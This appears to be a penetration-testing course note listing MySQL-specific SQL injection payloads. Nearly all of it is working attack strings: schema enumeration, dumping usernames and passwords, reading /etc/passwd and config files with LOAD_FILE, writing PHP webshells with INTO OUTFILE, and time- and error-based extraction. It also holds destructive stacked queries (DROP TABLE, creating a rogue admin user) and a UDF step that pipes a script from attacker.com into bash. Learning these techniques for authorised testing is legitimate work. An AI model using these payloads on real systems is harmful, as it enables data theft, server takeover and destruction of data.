---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.15 MySQL Specific Payloads"
---

# 06.15 — MySQL Specific Payloads

## MySQL Detection

```sql
-- DETECT MYSQL SPECIFICALLY:
-- MySQL accepts # as comment:
?id=1#                → works in MySQL, fails others
?id=1-- -             → MySQL-style comment

-- MySQL VERSION FUNCTIONS:
SELECT version()      → 8.0.28-0ubuntu0.20.04.3
SELECT @@version      → same
SELECT @@global.version → same

-- DETECT VIA SLEEP:
?id=1 AND SLEEP(5)--  → MySQL-specific

-- MYSQL SPECIFIC SYNTAX:
SELECT 1,2,3          → valid (no FROM needed for constants)
SELECT database()     → current database
SELECT user()         → current user (e.g., root@localhost)
SELECT @@hostname     → server hostname
SELECT @@datadir      → data directory
```

---

## MySQL Comment Styles

```sql
-- SINGLE-LINE COMMENT:
-- comment
# comment      (MySQL-only)
--+ comment    (URL-safe version, + = space)
-- - comment   (space after -- is required in some contexts)

-- INLINE COMMENT:
SELECT/*comment*/1
UN/**/ION SEL/**/ECT
UNION/*!50000SELECT*/NULL

-- CONDITIONAL COMMENT (executes in MySQL only):
/*!SELECT*/             → executes in MySQL (any version)
/*!50000SELECT*/        → executes only in MySQL >= 5.00.00
/*!80000SELECT*/        → executes only in MySQL >= 8.00.00
```

---

## MySQL Information Extraction

```sql
-- SYSTEM INFORMATION:
SELECT @@version              -- MySQL version
SELECT @@global.version
SELECT version()
SELECT @@hostname             -- hostname
SELECT @@datadir              -- data directory path
SELECT @@basedir              -- install directory
SELECT user()                 -- current DB user
SELECT current_user()
SELECT database()             -- current database
SELECT @@secure_file_priv     -- allowed directory for FILE operations

-- ALL DATABASES:
SELECT schema_name FROM information_schema.schemata;
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;

-- ALL TABLES IN CURRENT DB:
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database();

-- ALL TABLES IN SPECIFIC DB:
SELECT table_name FROM information_schema.tables WHERE table_schema='myapp';

-- ALL COLUMNS IN TABLE:
SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users';
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';

-- ROW COUNT:
SELECT COUNT(*) FROM users;

-- ALL USER PRIVILEGES:
SELECT * FROM information_schema.USER_PRIVILEGES;
SELECT * FROM mysql.user;        -- requires root!

-- CHECK IF FILE PRIVILEGE EXISTS:
SELECT file_priv FROM mysql.user WHERE user=user();
```

---

## MySQL Data Extraction

```sql
-- DUMP ALL ROWS:
SELECT * FROM users;

-- WITH CONCAT (useful in UNION with fewer columns):
SELECT CONCAT(username,':',password) FROM users;
SELECT CONCAT_WS(':',username,password,email) FROM users;  -- separator version

-- ALL ROWS AS SINGLE STRING:
SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n') FROM users;
SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x2c) FROM users;  -- hex delimiters

-- PAGINATION (LIMIT/OFFSET):
SELECT username FROM users LIMIT 0,1;    -- first row
SELECT username FROM users LIMIT 1,1;    -- second row
SELECT username FROM users LIMIT 2,1;    -- third row

-- EXTRACT SPECIFIC USER:
SELECT password FROM users WHERE username='admin';
SELECT password FROM users ORDER BY id LIMIT 1;  -- first user (often admin)
```

---

## MySQL FILE Read / Write

```sql
-- READ FILE (requires FILE privilege + secure_file_priv allows it):
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');  -- source code!
SELECT LOAD_FILE('/proc/self/environ');

-- CHECK IF FILE READ WORKS:
SELECT LOAD_FILE('/etc/passwd') LIMIT 1;
-- NULL → no permission / file doesn't exist
-- File content → FILE privilege granted!

-- CHECK secure_file_priv (where files can be read from):
SELECT @@secure_file_priv;
-- NULL → any location allowed (best for attacker!)
-- /var/lib/mysql/ → only that directory
-- '' (empty) → any location allowed too

-- UNION EXPLOIT FOR FILE READ:
?id=99 UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--

-- WRITE FILE (requires FILE privilege AND secure_file_priv=''):
SELECT 'test' INTO OUTFILE '/var/www/html/test.txt';

-- WRITE PHP WEBSHELL:
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
-- Then access: https://target.com/shell.php?cmd=id

-- WRITE WITH DUMPFILE (no newline added):
SELECT CHAR(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,109,100,39,93,41,59,63,62) 
INTO DUMPFILE '/var/www/html/shell.php';
-- (hex encoded: <?php system($_GET['cmd']);?>)
```

---

## MySQL Time-Based Payloads

```sql
-- SLEEP:
SELECT SLEEP(5)
' AND SLEEP(5)--
' OR SLEEP(5)--

-- CONDITIONAL SLEEP:
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--
' AND IF(LENGTH(database())>5, SLEEP(5), 0)--

-- BENCHMARK (alternative, CPU-based delay):
SELECT BENCHMARK(5000000, SHA1(1))
' AND BENCHMARK(5000000, SHA1(1))--

-- HEAVY QUERY (may cause OOM/high CPU):
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
```

---

## MySQL Error-Based Payloads

```sql
-- EXTRACTVALUE (main technique):
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@datadir)))--

-- EXTRACTION (30 char limit — use SUBSTRING):
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(username,':',password) FROM users), 1, 30)))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(username,':',password) FROM users), 31, 30)))--

-- UPDATEXML:
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())), 1)--

-- FLOOR + RAND + GROUP BY:
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--

-- EXP() overflow:
' AND EXP(~(SELECT * FROM (SELECT database())a))--
-- Error: "DOUBLE value is out of range in 'exp(~(select...))"
```

---

## MySQL Stacked Queries

```sql
-- STACKED QUERIES (multiple statements):
-- Only works when the driver supports multi-query!
-- PHP MySQLi: mysqli_multi_query()
-- PHP PDO: PDO::MYSQL_ATTR_MULTI_STATEMENTS
-- Not supported by default in all frameworks!

' ; DROP TABLE users--         -- DELETE TABLE (DESTRUCTIVE — don't do in real tests!)
' ; INSERT INTO users (username,password) VALUES ('hacker','password')--
' ; UPDATE users SET is_admin=1 WHERE username='hacker'--
' ; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--  -- create admin DB user!
' ; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password'; GRANT ALL ON *.* TO 'hacker'@'%'--
```

---

## MySQL User-Defined Functions (UDF) — RCE

```sql
-- UDF RCE (advanced — requires FILE privilege and specific conditions):
-- 1. Upload UDF shared library to MySQL plugin dir:
SELECT @@plugin_dir;
-- /usr/lib/mysql/plugin/

-- 2. Write UDF library (hex-encoded shared lib):
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 3. Create function:
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';

-- 4. Execute commands:
SELECT sys_exec('id > /tmp/out.txt');
SELECT sys_exec('curl http://attacker.com/shell.sh | bash');

-- METASPLOIT MODULE:
-- exploit/multi/handler + MySQL UDF Injection module
```

---

## MySQL Cheat Sheet Summary

```
DETECTION:  version(), @@version, SLEEP(5), #comment
DATABASES:  SELECT schema_name FROM information_schema.schemata
TABLES:     SELECT table_name FROM information_schema.tables WHERE table_schema=database()
COLUMNS:    SELECT column_name FROM information_schema.columns WHERE table_name='users'
DATA:       SELECT CONCAT(username,':',password) FROM users
FILE READ:  SELECT LOAD_FILE('/etc/passwd')
FILE WRITE: SELECT '<?php...?>' INTO OUTFILE '/var/www/html/shell.php'
TIME:       SELECT SLEEP(5) / IF(cond, SLEEP(5), 0)
ERROR:      EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ...)))
```

---

## Related Notes
- [[04 - Union-Based SQLi]] — UNION exploitation
- [[03 - Error-Based SQLi]] — EXTRACTVALUE/UPDATEXML
- [[06 - Blind SQLi Time-Based]] — SLEEP-based
- [[24 - Reading Files via SQLi]] — LOAD_FILE deep dive
- [[25 - Writing Files via SQLi]] — INTO OUTFILE webshell
